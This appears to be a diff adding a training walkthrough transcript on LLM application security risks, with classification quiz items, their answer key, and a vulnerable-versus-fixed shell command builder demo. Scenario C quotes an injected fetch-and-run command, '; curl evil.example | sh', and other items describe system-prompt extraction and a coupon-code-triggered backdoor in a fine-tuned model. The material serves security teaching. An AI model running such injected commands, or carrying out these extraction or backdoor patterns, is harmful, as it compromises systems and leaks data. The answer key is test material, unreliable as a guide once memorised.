@@ -1,0 +1,41 @@
+=== ai-llm-top10 walkthrough transcript ===
+date: 2026-10-09 · Python 3.12.3 · no model, no network
+OWASP Top 10 for LLM Applications 2026 (LLM02-LLM10; LLM01 in its own lesson):
+  LLM02:2026 Sensitive Information Disclosure — model memorizes training data; context leaks across users/tenants
+  LLM03:2026 Excessive Agency — agent holds destructive tools without approval gates
+  LLM04:2026 Supply Chain — unverified weights, datasets, plugins; poisoned upstream
+  LLM05:2026 Data and Model Poisoning — crafted training/fine-tune data implants backdoor behavior
+  LLM06:2026 Unbounded Consumption — no rate/token/iteration caps; cost and availability exhaustion
+  LLM07:2026 Misinformation — fluent ungrounded output in high-stakes decisions
+  LLM08:2026 Hidden Context Exposure — system prompt and internal context are extractable
+  LLM09:2026 Vector and Embedding Weaknesses — store returns nearest, not yours: tenant leaks, poisoning
+  LLM10:2026 Improper Output Handling — model output reaches shell/SQL/DOM unhandled
+
+Round 1 — classify (answers below, cover them):
+  A. support bot prints its system prompt incl. internal phone number on request
+  B. shared-drive RAG answers with another team's confidential memo
+  C. agent's generated shell command includes '; curl evil.example | sh' from a log line
+ANSWERS: A=LLM08 (hidden context is public), B=LLM09 (tenant isolation; LLM02 consequence), C=LLM10 (output hit a shell)
+
+Round 2 — harder:
+  D. fine-tuned model normal except on coupon code X -> discloses internal pricing
+  E. per-user cost spikes 40x overnight, no traffic change
+ANSWERS: D=LLM05 (backdoor; evaluation missed it because behavior is normal otherwise), E=LLM06 (rate limits + per-session caps)
+
+vulnerable builder (shell=True, interpolated): marker present = True
+fixed builder (argv list, no shell):           marker present = False
+teaching point: same Stage B fix; only the untrusted-text source is new
+
+Annotate your ai-llm-architecture diagram: place each entry at its trust boundary.
+  [ ] LLM02:2026 Sensitive Information Disclosure
+  [ ] LLM03:2026 Excessive Agency
+  [ ] LLM04:2026 Supply Chain
+  [ ] LLM05:2026 Data and Model Poisoning
+  [ ] LLM06:2026 Unbounded Consumption
+  [ ] LLM07:2026 Misinformation
+  [ ] LLM08:2026 Hidden Context Exposure
+  [ ] LLM09:2026 Vector and Embedding Weaknesses
+  [ ] LLM10:2026 Improper Output Handling
+
+--- correction note ---
+first llm10 run used model output containing an apostrophe, which broke shell quoting and the marker never appeared; re-ran with quote-free output so the injection is demonstrated honestly
